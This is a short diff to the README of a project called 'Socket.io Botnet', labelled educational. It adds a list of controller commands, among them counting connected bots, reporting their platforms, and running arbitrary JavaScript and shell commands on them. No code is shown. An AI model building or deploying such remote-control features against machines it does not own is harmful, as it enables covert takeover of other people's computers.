@@ -1,6 +1,13 @@
 # Socket.io Botnet
 ## (NOTICE) THIS WAS MADE ONLY FOR EDUCATIONAL TO SHOW HOW SOCKET.IO COULD BE USED AS BOTNET FOR RESEARCH PURPOSES
 
+# Commands
+  - help - Display all commands
+  - botcount - Display count of connected bots
+  - platform - Shows you how much bots are running each platform
+  - eval <command> - Evaluates JavaScript code
+  - exec <command> - Execues shell command
+
 # Modules Used:
   # Server
     - socket.io
